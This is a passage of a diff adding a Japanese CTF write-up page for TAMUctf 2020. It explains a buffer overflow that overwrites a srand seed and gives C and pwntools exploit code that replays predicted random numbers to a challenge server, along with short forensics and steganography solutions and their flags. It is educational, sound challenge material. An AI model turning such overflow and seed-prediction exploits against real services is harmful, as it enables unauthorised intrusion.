+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You</span><span class="se">\&#39;</span><span class="s">ve guessed all of my numbers. Here is your reward.&#34;</span><span class="p">);</span>
+      <span class="n">local_28</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">local_28</span> <span class="o">!=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">local_98</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="n">local_98</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Goodbye.&#34;</span><span class="p">);</span>
+      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+    <span class="n">local_1c</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">%</span> <span class="mi">100000</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;I am thinking of a number from 1-100000. What is it?&#34;</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001020a5</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_2c</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">local_1c</span> <span class="o">!=</span> <span class="n">local_2c</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Impressive.&#34;</span><span class="p">);</span>
+    <span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You have failed. Goodbye.&#34;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>やっていること：</p>
+
+<ol>
+<li>time()で時間を取る<br></li>
+<li>上記の値を使ってsrand()コール<br></li>
+<li>rand()を使って、1~100000の乱数を生成<br></li>
+<li>これを99回ぴったり予想できたらフラグ表示<br></li>
+</ol>
+
+<p>だいたい、こんな感じ。だと思います。</p>
+
+<p><br>
+どうして最初に名前を入力する箇所があるのかを考えると、BOFを使ってsrand()の引数を初期化し乱数を固定する、というのが解法のようですね。</p>
+
+<p><br>
+名前は <code>local_58[44]</code> に入るので、srand()の引数になっている <code>local_18</code> を上書きするには、他のローカル変数等を考慮すると76バイト(44+32)に必要になります。</p>
+
+<p>全部 'A' で埋めちゃうことにします。</p>
+
+<p><br>
+別途Cでコードを書いて、0x4141414141414141をシードにしたときの乱数のリストを予め計算しておきます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
+	<span class="n">time_t</span> <span class="n">local_18</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
+	
+	<span class="n">local_18</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="n">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+	<span class="n">local_18</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
+	<span class="n">srand</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
+	<span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">while</span><span class="p">(</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="mi">99</span> <span class="o">&lt;</span> <span class="n">local_c</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="n">iVar1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+		<span class="n">local_1c</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">%</span> <span class="mi">100000</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">local_1c</span><span class="p">);</span>
+		<span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br>
+Pwnのコードです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">if</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./troll&#39;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challenges.tamuctf.com&#39;</span><span class="p">,</span> <span class="mi">4765</span><span class="p">)</span>
+
+<span class="n">ans</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x6e01</span><span class="p">,</span><span class="mh">0xe18f</span><span class="p">,</span><span class="mh">0xe4f8</span><span class="p">,</span><span class="mh">0xc5a9</span><span class="p">,</span><span class="mh">0xa2c5</span><span class="p">,</span><span class="mh">0x13c9f</span><span class="p">,</span><span class="mh">0x330a</span><span class="p">,</span><span class="mh">0xc382</span><span class="p">,</span><span class="mh">0x10c13</span><span class="p">,</span><span class="mh">0x444</span><span class="p">,</span><span class="mh">0x160cc</span><span class="p">,</span><span class="mh">0x1427e</span><span class="p">,</span><span class="mh">0x826f</span><span class="p">,</span><span class="mh">0x748c</span><span class="p">,</span><span class="mh">0xd291</span><span class="p">,</span><span class="mh">0xca0f</span><span class="p">,</span><span class="mh">0xc122</span><span class="p">,</span><span class="mh">0x7e9d</span><span class="p">,</span><span class="mh">0x16c7e</span><span class="p">,</span><span class="mh">0x1801e</span><span class="p">,</span><span class="mh">0xcf4b</span><span class="p">,</span><span class="mh">0x604</span><span class="p">,</span><span class="mh">0x30d4</span><span class="p">,</span><span class="mh">0xd9a1</span><span class="p">,</span><span class="mh">0x4fac</span><span class="p">,</span><span class="mh">0x12498</span><span class="p">,</span><span class="mh">0x1847e</span><span class="p">,</span><span class="mh">0x14eba</span><span class="p">,</span><span class="mh">0x14529</span><span class="p">,</span><span class="mh">0xfeaa</span><span class="p">,</span><span class="mh">0x72b6</span><span class="p">,</span><span class="mh">0x2c89</span><span class="p">,</span><span class="mh">0x5998</span><span class="p">,</span><span class="mh">0x10ed</span><span class="p">,</span><span class="mh">0x13212</span><span class="p">,</span><span class="mh">0x13c3d</span><span class="p">,</span><span class="mh">0x14d8c</span><span class="p">,</span><span class="mh">0x1651b</span><span class="p">,</span><span class="mh">0xb8fe</span><span class="p">,</span><span class="mh">0xd2fe</span><span class="p">,</span><span class="mh">0x229e</span><span class="p">,</span><span class="mh">0x9329</span><span class="p">,</span><span class="mh">0x8edb</span><span class="p">,</span><span class="mh">0xa50d</span><span class="p">,</span><span class="mh">0x14795</span><span class="p">,</span><span class="mh">0x1aab</span><span class="p">,</span><span class="mh">0x285b</span><span class="p">,</span><span class="mh">0x8216</span><span class="p">,</span><span class="mh">0x9948</span><span class="p">,</span><span class="mh">0x4e18</span><span class="p">,</span><span class="mh">0x7b93</span><span class="p">,</span><span class="mh">0x21d2</span><span class="p">,</span><span class="mh">0x541b</span><span class="p">,</span><span class="mh">0xac66</span><span class="p">,</span><span class="mh">0xfb72</span><span class="p">,</span><span class="mh">0xe3a7</span><span class="p">,</span><span class="mh">0x8a3d</span><span class="p">,</span><span class="mh">0xf94f</span><span class="p">,</span><span class="mh">0xabc0</span><span class="p">,</span><span class="mh">0x48c5</span><span class="p">,</span><span class="mh">0xb139</span><span class="p">,</span><span class="mh">0x15e55</span><span class="p">,</span><span class="mh">0xb52e</span><span class="p">,</span><span class="mh">0x10ad0</span><span class="p">,</span><span class="mh">0x2882</span><span class="p">,</span><span class="mh">0x609f</span><span class="p">,</span><span class="mh">0x1004c</span><span class="p">,</span><span class="mh">0x1760d</span><span class="p">,</span><span class="mh">0x7ef9</span><span class="p">,</span><span class="mh">0x32a9</span><span class="p">,</span><span class="mh">0x1024a</span><span class="p">,</span><span class="mh">0xa196</span><span class="p">,</span><span class="mh">0x105b2</span><span class="p">,</span><span class="mh">0x4a64</span><span class="p">,</span><span class="mh">0x18682</span><span class="p">,</span><span class="mh">0xc6a6</span><span class="p">,</span><span class="mh">0x650f</span><span class="p">,</span><span class="mh">0x283c</span><span class="p">,</span><span class="mh">0x148bb</span><span class="p">,</span><span class="mh">0x13e36</span><span class="p">,</span><span class="mh">0x7654</span><span class="p">,</span><span class="mh">0x3dad</span><span class="p">,</span><span class="mh">0x16007</span><span class="p">,</span><span class="mh">0x10a4e</span><span class="p">,</span><span class="mh">0xea12</span><span class="p">,</span><span class="mh">0x114b9</span><span class="p">,</span><span class="mh">0xa734</span><span class="p">,</span><span class="mh">0x2d8e</span><span class="p">,</span><span class="mh">0xc747</span><span class="p">,</span><span class="mh">0xc33</span><span class="p">,</span><span class="mh">0x7652</span><span class="p">,</span><span class="mh">0x1787f</span><span class="p">,</span><span class="mh">0x16a88</span><span class="p">,</span><span class="mh">0x12b7f</span><span class="p">,</span><span class="mh">0xfcaf</span><span class="p">,</span><span class="mh">0xc69</span><span class="p">,</span><span class="mh">0x455d</span><span class="p">,</span><span class="mh">0xb63a</span><span class="p">,</span><span class="mh">0x3bb5</span><span class="p">,</span><span class="mh">0xc455</span><span class="p">]</span>
+    
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">44</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Who goes there?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvregex</span><span class="p">(</span><span class="s1">&#39;I am thinking of a number from 1-100000. What is it?|You.*&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&#34;You&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">break</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;0x{:x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>  <span class="c1"># Impressive</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br>
+Flag <code>gigem{Y0uve_g0ne_4nD_!D3fe4t3d_th3_tr01L!}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="misc-corrupted-disk">[Misc]: CORRUPTED_DISK</h2>
+
+<hr />
+
+<h3 id="challenge-4">Challenge</h3>
+
+<blockquote>
+<p>We've recovered this disk image but it seems to be damaged. Can you recover any useful information from it?</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>recovered_disk.img</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution-4">Solution</h3>
+
+<p>これは、foremostで取れました。</p>
+
+<p>Flag: <code>gigem{wh3r3_w3r3_601n6_w3_d0n7_n33d_h34d3r5}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="misc-zippity-doo-dah">[Misc]: ZIPPITY_DOO_DAH</h2>
+
+<hr />
+
+<h3 id="challenge-5">Challenge</h3>
+
+<blockquote>
+<p>Lorelei, a nuclear engineer, is practicing how to create folders to organize her notes. She works closely with POTUS to secure our nuclear missiles. In order for her to send the nuclear codes to the correct authorities, she needs to zip all the files and make the data hard to find. Your mission, should you choose to accept it, is to intercept and find the codes (the flag).</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>zipFolder.zip</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution-5">Solution</h3>
+
+<p>Zipを解凍すると大量にテキストファイルが出てくるんですが、テキストファイルは全部Decoyで、フラグはZipの中にあった画像ファイルからzstegで取れます。</p>
+
+<pre>
+=== zsteg ===
+b1,rgb,lsb,xy       .. text: "gigem{z1pT4st1c__$kiLl$$$}"
+</pre>
+
+<p><br>
+Flag: <code>gigem{z1pT4st1c__$kiLl$$$}</code></p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<hr />
+
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2020-03-30
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/riftctf_2020/">
+            <span class="next-text nav-default">RiftCTF 2020 Writeup | フラxxグゲット</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2020
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/dist/even.26188efa.min.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
